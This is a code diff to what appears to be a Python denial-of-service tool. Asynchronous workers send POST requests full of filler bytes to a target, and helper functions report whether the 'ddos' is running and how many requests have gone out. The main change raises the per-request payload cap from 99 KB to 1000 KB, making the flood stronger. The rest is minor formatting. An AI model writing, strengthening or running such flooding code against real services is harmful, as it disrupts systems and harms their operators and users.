@@ -888,7 +888,7 @@ async def _worker(worker_id, target, kb_size, on_update):
     global _is_running, _total_requests
     try:
         payload_kb = int(kb_size) if kb_size else 10
-        if payload_kb > 99: payload_kb = 99
+        if payload_kb > 1000: payload_kb = 1000
         if payload_kb <= 0: payload_kb = 1
         data = b"A" * (1024 * payload_kb)
     except:
@@ -920,7 +920,7 @@ async def _worker(worker_id, target, kb_size, on_update):
                     "Accept-Encoding": "gzip, deflate, br",
                     "Connection": "keep-alive",
                     "Cache-Control": "no-cache",
-                    "Pragma": "no-cache",
+                    "Pragma": "no-cache"
                 }
                 async with session.post(target, data=data, headers=headers, timeout=10) as resp:
                     status = resp.status
@@ -975,4 +975,4 @@ def is_ddos_running():
     return _is_running
 
 def get_total_requests():
-    return _total_requests
+    return _total_requests 
